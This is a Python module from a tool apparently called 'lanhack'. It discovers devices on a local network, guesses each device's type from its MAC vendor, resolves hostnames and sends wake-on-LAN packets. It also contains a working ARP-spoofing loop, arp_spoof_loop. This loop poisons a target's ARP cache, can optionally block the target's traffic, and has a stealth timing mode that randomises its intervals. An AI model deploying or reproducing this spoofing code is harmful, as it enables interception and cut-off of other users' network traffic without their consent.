import socket, struct, subprocess, threading, time, os, random as _random
from collections import defaultdict

import scapy.all as scapy

from lanhack import config

DEVICE_TYPES = {
    "Apple": "macOS/iOS", "Samsung": "Samsung", "LG": "LG TV",
    "Google": "Google", "Amazon": "Amazon", "Roku": "Roku",
    "Xiaomi": "Xiaomi", "Huawei": "Huawei", "TP-Link": "Router",
    "Netgear": "Router", "Cisco": "Network", "Asus": "Asus",
    "Intel": "Computer", "Realtek": "Computer", "VMware": "Virtual",
    "Raspberry Pi": "Pi/Linux", "Espressif": "IoT", "Tuya": "IoT",
    "Sonos": "Speaker",     "Dell": "Windows PC", "HP": "HP Device", "HP Inc.": "HP Device",
    "Microsoft": "Windows", "Nintendo": "Nintendo", "Sony": "Sony",
    "Lenovo": "Windows PC", "Acer": "Windows PC",
    "Ubiquiti": "Network", "Hikvision": "Camera", "MikroTik": "Router",
    "Wyze": "IoT", "Arris": "Router", "D-Link": "Router",
    "ZTE": "Router", "Canon": "Printer", "Panasonic": "TV",
    "Toshiba": "TV", "Xerox": "Printer",
}

def vendor(mac):
    prefix = mac[:8].lower()
    val = config.OUI_DB.get(prefix)
    if val:
        return val
    try:
        import urllib.request as _ur
        url = f"https://api.macvendors.com/{prefix.replace(':', '')}"
        req = _ur.Request(url, headers={"User-Agent": "lanhack/1.0"})
        resp = _ur.urlopen(req, timeout=2)
        name = resp.read().decode().strip()
        if name:
            config.OUI_DB[prefix] = name
            return name
    except: pass
    return "Unknown"

APPLE_VENDORS = {"Apple"}
WINDOWS_VENDORS = {"Microsoft", "Dell", "Lenovo", "Acer"}

def fingerprint_device(ip, timeout=1):
    dev_vendor = ""
    dev_mac = ""
    for d in config.devices:
        if d["ip"] == ip:
            dev_vendor = d.get("vendor", "")
            dev_mac = d.get("mac", "")
            break
    if not dev_mac:
        return "Unknown", []
    mac_prefix = dev_mac[:8].lower()
    oui_lookup = config.OUI_DB.get(mac_prefix, "")
    if not dev_vendor or dev_vendor == "Unknown":
        dev_vendor = oui_lookup
    for v in APPLE_VENDORS:
        if v.lower() in dev_vendor.lower() or v.lower() in oui_lookup.lower():
            return "macOS/iOS", []
    for v in WINDOWS_VENDORS:
        if v.lower() in dev_vendor.lower():
            return "Windows", []
    guess = DEVICE_TYPES.get(dev_vendor, "Unknown")
    if guess == "Unknown" and oui_lookup:
        guess = DEVICE_TYPES.get(oui_lookup, "Unknown")
    return guess, []

def wake_on_lan(mac):
    try:
        mac_clean = mac.replace(":", "").replace("-", "")
        data = bytes.fromhex("ff" * 6 + mac_clean * 16)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.sendto(data, ("<broadcast>", 9))
        sock.sendto(data, ("255.255.255.255", 9))
        sock.close()
        return True
    except: return False

def detect_network():
    for cmd in ["/usr/sbin/ip", "/sbin/ip", "/usr/bin/ip", "ip"]:
        try:
            out = subprocess.check_output([cmd, "route", "get", "1.1.1.1"], text=True).strip()
            parts = out.split()
            for i, p in enumerate(parts):
                if p == "via" and i+1 < len(parts): config.gateway_ip = parts[i+1]
                if p == "dev" and i+1 < len(parts): config.iface = parts[i+1]
                if p == "src" and i+1 < len(parts): config.my_ip = parts[i+1]
            break
        except: continue
    if not config.gateway_ip:
        with open("/proc/net/route") as f:
            for line in f:
                fields = line.strip().split()
                if fields[1] == '00000000' and fields[2] != '00000000':
                    config.gateway_ip = socket.inet_ntoa(struct.pack("<I", int(fields[2], 16)))
                    config.iface = fields[0]; break
    if not config.my_ip:
        try: config.my_ip = scapy.get_if_addr(config.iface)
        except: pass
    octets = config.my_ip.split(".")
    if len(octets) == 4:
        config.netmask = f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
    else:
        config.netmask = ""
    return config.iface, config.my_ip, config.gateway_ip, config.netmask

def _resolve_hostname(ip):
    try:
        import subprocess as _sp
        socket.setdefaulttimeout(2)
        name = socket.gethostbyaddr(ip)[0].split('.')[0]
        if name and not name.startswith("?"):
            return name
    except: pass
    try:
        res = _sp.run(["nmblookup", "-A", ip], capture_output=True, text=True, timeout=2)
        for line in res.stdout.split("\n"):
            if "<00>" in line and "UNIQUE" in line:
                return line.split()[0]
    except: pass
    try:
        res = _sp.run(["host", ip], capture_output=True, text=True, timeout=2)
        m = __import__('re').search(r'domain name pointer (.+)\.', res.stdout)
        if m: return m.group(1).split('.')[0]
    except: pass
    return ""

def arp_scan(subnet=None):
    ans, _ = scapy.arping(subnet or config.netmask, timeout=3, verbose=False)
    found = []
    for _, recv in ans:
        hn = _resolve_hostname(recv.psrc)
        found.append({"ip":recv.psrc,"mac":recv.hwsrc,"vendor":vendor(recv.hwsrc),"hostname":hn,"fingerprint":"","open_ports":""})
    return [d for d in found if d["ip"] != config.my_ip]

def arp_spoof_loop(tip, tmac, gw, ev, block=True):
    mmac = scapy.get_if_hwaddr(config.iface)
    while ev.is_set() and not config.quit_flag:
        scapy.sendp(scapy.Ether(dst=tmac)/scapy.ARP(op=2,pdst=tip,psrc=gw,hwdst=tmac), verbose=False)
        if block:
            scapy.sendp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(op=2,pdst=gw,psrc=tip,hwdst="ff:ff:ff:ff:ff:ff"), verbose=False)
        time.sleep(_random.choice(config.stealth_intervals) if config.stealth_mode else 1.5)

def device_label(ip):
    for d in config.devices:
        if d["ip"]==ip:
            n=d["hostname"] or d["vendor"]
            return f"{n} ({ip})" if n and n!="Unknown" else ip
    return ip

def main_site(domain):
    for c,m in config.CDN_MAP.items():
        if c in domain and m: return m
    return domain
